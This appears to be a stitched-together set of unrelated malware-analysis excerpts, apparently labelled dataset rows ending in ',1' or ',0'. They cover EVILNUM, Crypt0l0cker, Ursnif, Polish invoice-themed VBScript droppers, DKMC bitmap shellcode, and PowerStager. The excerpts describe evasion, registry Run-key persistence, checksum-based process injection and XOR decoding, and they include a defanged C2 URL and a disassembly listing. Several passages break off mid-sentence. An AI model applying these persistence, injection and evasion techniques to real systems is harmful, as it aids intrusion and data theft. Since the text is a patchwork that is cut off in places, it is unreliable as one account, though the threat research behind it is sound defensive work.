The first version of EVILNUM was identified in 2018; the second version was discovered in an unrelated incident response investigation a year later, having infiltrated a FINTECH company. The initial reporting on this malware was the only sign of its presence, as it briefly faded from view. EVILNUM has surfaced again in the financial sector with a new variant that has evolved with a very effective tool designed to evade both standard network- and host-based detection systems. It uses supplementary logic designed to help it adapt to the local system and alter its actions - and even the choice of C2 - based upon the antivirus products that are detected on the host machine. This agent allows the threat actor to upload files, download files, run commands, steal cookies and access other protected data. It is designed to persist through reboot by adding a registry key, and even removes artifacts of its presence from the host machine. Given the versatility added to this variant, we suspect that this agent has the capacity to load auxiliary payloads onto a host machine. Technical Details Introduction Prevailion has discovered an updated variant of the deceptive EVILNUM agent. This agent was delivered to victims from a URL on a cloud-platform that hosts a zip file. If the link is clicked, the victim downloads a compressed folder riddled with trojanized files that masquerade as PDFs and JPEGs.

It is worth to note that besides using TLS encrypted back channels for exfiltrating user and other information to servers placed in the internet, the sample uses Tor as a backup for these connections. In other ransomware campaigns we have often seen that only the payment process was protected by Tor, not the whole infection chain. Crypt0l0cker appears to be using the Tor servers as fallbacks, if the SSL servers are not reachable. More and more malware is leveraging Tor to hide their tracks. Obviously this makes it harder to detect these campaigns in the network traffic (Tor traffic aside). It also takes more time to identify the malware infrastructure to finally take them down. As usual, after the infection process is done, the ransomware encrypts all user files and displays the well known user messages (see below). The malware also comes with full localization. The payload displays the messages in different languages depending on the victim’s geographic location based on his or her IP address (including some grammar mistakes which suggest native speakers were not used for translation but perhaps services similar to Google Translate): Victim IP address in Germany: Fig.B Victim IP address in Italy: Fig.C Victim IP address in the UK: Fig.D The attackers were using a Web2Tor gateway to make it easier for the victim to get to the Decryption Portal hosted on the Tor network.

The newly discovered Ursnif variant comes with enhanced stealing modules focused on stealing data from mail clients and email credentials stored in browsers. The revamping and introduction of new mail stealer modules puts an emphasis on the risk that trojans can pose to enterprises if corporate accounts are compromised.

There will be a few variations of this over the next several months, but regardless of language, invoices and billing will always play a vital role in these spam campaigns. As far as the attachment itself, it typically consists of a RAR file with a filename that contains the word ""faktura."" The RAR files typically contain a VBScript that reaches out for additional payloads. The script itself already had some interesting techniques associated with sandbox or network simulation evasion, which we will discuss later in the blog. This script wasn't heavily obfuscated, and efficiently established command and control (C2) communication with a hard-coded IP address via HTTP using wscript. The specific URL being queried in this particular campaign was: http://162[.]251[.]166[.]72/about.php?faxid=446708802&opt=. Over time, a pattern started to emerge: The campaigns would run for a week or two and then go quiet for a couple of weeks before restarting. The modus operandi for the actor was largely the same throughout, Polish language spam campaigns related to invoices or ""Faktura"" that contained a RAR file with malicious VBScript inside. One thing of note about these campaigns is in the downtime changes and improvements were being made to the way the VBScript tries to evade detection and analysis or how the C2 communication was established. Let's walk through some examples. Network simulation evasion, multi-path C2 implemented The second major campaign we analyzed had already added some functionality. Initially, the threat was trying to connect to a non-existent domain to check for things like network simulation. This second campaign implemented an ""infinite"" recursive loop that continues to repeat itself if that GET request resulted in an HTTP/200 indicating a successful request. Here is a quick screenshot showing that new functionality. This simple snippet of code includes the GET request to a non-existent domain (www[.]dencedence[.]denceasdq) (1), the steps taken if an HTTP/200 is provided in response to that request (2), and finally enters an ""infinite"" recursive loop when an HTTP/200 is found (3).

Attackers are like water — they will attempt to find the smallest crack to achieve their goals. While organizations need to be focused on protecting their most valuable assets, they should not ignore threats that are not particularly targeted toward their infrastructure. Technical case overview Introduction The initial trigger for this investigation was a telemetry entry that showed a PowerShell process launching a download and executing a PowerShell loader. After the drill-down, the telemetry shows that the PowerShell downloading code was launched by an executable dropper included in an ISO image that's mounted within the operating system by the user. The ISO image seems to have been downloaded compressed with ZIP, possibly encrypted with a password, which indicates it's primarily spread via email. Executable dropper with anti-sandboxing The dropper's functionality is rather simple, but the code contains some interesting features. All malicious API calls are resolved dynamically but locating the PEB and traversing one of the lists of loaded modules in memory to find the module address. From there, the downloader goes through the export table in order to find and return the address of the required functions which is then indirectly called using one of the 'call reg' instructions. All strings, including the entire command line for the downloader PowerShell code are encrypted with a static byte key, different for each string, which also gets decrypted during the execution. Command-line for the PowerShell downloader is deobfuscated using a byte XOR key. The most interesting feature is the function that randomly calls APIs from the lists twice. First, two randomly generated numbers from 0 to 9 are generated by a pseudo-random number generator and those numbers — m",1

Additionally, we see the majority of the downloads originating from both the Palestinian Territories as well as the United Arab Emirates. This provides clues as to who the victims are or where attackers may originate from. Figure 2 Statistics surrounding malicious redirect Technique #2 – Don’t Kill My Cat Attacks The second technique uses an interesting tactic that Unit 42 has not seen before. Specifically, it makes use of an attack discussed in July of this year called Don’t Kill My Cat or DKMC. DKMC can enable an attacker to load a legitimate bitmap (BMP) file that contains shellcode within it. The DKMC tool and more information about this tactic may be found here . This specific attack begins with a malicious executable file that downloads a legitimate BMP file that looks like the following: Figure 3 Malicious BMP image retrieved by downloader It should be noted that this is the same image used in the DKMC presentation. It would appear that the attackers simply used the default settings of this particular program. This BMP file is loaded as shellcode. The first six bytes are read as the following instructions: seg000:00000000 inc edxseg000:00000001 dec ebpseg000:00000002 jmp loc_34D8B 1 2 3 seg000 : 00000000 inc edx seg000 : 00000001 dec ebp seg000 : 00000002 jmp loc_34D8B Code execution is then redirected to embedded shellcode. The underlying shellcode is decrypted at runtime using a 4-byte XOR key of 0x3C0922F0. The shellcode eventually loads an embedded UPX-packed executable and redirects execution to this file.

Next, the malware will make sure that all of the users on the machine are infected, by enumerating the registry root key HKU and for each user key, it will put an appropriate startup value, as well as the payload on each AppData folder of each user. Registry Keys used: • HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Run\ • HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\ AppData ○ (Value equals the folder to be used for the malware, for example: C:\Users\Administrator\Appdata\Roaming\"") After this procedure, we move on to the injection method. And It Continues With Another Executable To Be Injected In the second part, the malware will look for a legitimate process to run in its context. Running in a different process context allows the malware to bypass firewall rules which let some processes through without alerting or blocking them. Internally, the malware calculates a unique checksum for each process name it finds, in order to obfuscate the processes into which it will try to inject itself. Instead of injecting to `explorer.exe` for example, a checksum will be calculated, resulting in something like 0x17F9B5AA. Then, it will check if that value matches a value from an internal list of checksums, and only if it exists in that list, it will begin the injection method on that process.

This value is again referenced later on deep within multiple layers of PowerShell scripts and gave further credence to this theory, as typically these random file names are generated on the fly and not embedded within. The initial executable created by PowerStager is pretty straight forward. It gets the %TMP% environment path and creates the file with the embedded file name. Afterwards it performs two memcpy() calls for data found within the .data section of the executable and moves them into a new memory page. For the sample looked at in this analysis, the first memcpy() grabs data from offset 0x20 in the .data section, whereas the second memcpy() grabs the same size of data from offset 0x67E0. Finally, it runs a decoding function on it before finally saving it to the file. 0040164E |> /8D95 D8C6FFFF /LEA EDX,[LOCAL.3658]00401654 |. |8B45 F4 |MOV EAX,[LOCAL.3]00401657 |. |01D0 |ADD EAX,EDX ; 75809731.004067E000401659 |. |0FB618 |MOVZX EBX,BYTE PTR DS:[EAX]0040165C |. |8B4D F4 |MOV ECX,[LOCAL.3]0040165F |. |89C8 |MOV EAX,ECX00401661 |. |C1E8 06 |SHR EAX,600401664 |. |BA 9D889704 |MOV EDX,497889D00401669 |. |F7E2 |MUL EDX ; 75809731.004067E00040166B |. |89D0 |MOV EAX,EDX ; 75809731.004067E00040166D |. |C1E8 02 |SHR EAX,200401670 |. |69C0 C0370000 |IMUL EAX,EAX,37C000401676 |. |29C1 |SUB ECX,EAX00401678 |. |89C8 |MOV EAX,ECX0040167A |. |0FB68405 188FFF>|MOVZX EAX,BYTE PTR SS:[EBP+EAX+FFFF8F18]00401682 |. |31C3 |XOR EBX,EAX00401684 |. |89D9 |MOV ECX,EBX00401686 |. |8D95 D8C6FFFF |LEA EDX,[LOCAL.3658]0040168C |. |8B45",0
